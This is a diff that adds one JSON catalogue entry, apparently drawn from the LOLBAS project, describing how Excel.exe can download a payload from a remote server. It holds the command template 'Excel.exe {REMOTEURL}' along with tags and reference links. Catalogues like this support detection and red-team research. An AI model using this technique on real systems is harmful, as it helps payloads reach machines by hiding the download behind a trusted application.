@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-excel-exe-download",
+  "name": "LOLBAS · Excel.exe (Download)",
+  "command": "Excel.exe {REMOTEURL}",
+  "description": "Downloads payload from remote server",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "excel",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Excel/",
+  "upstream_id": "Excel.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Excel.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Excel/"
+    }
+  ]
+}
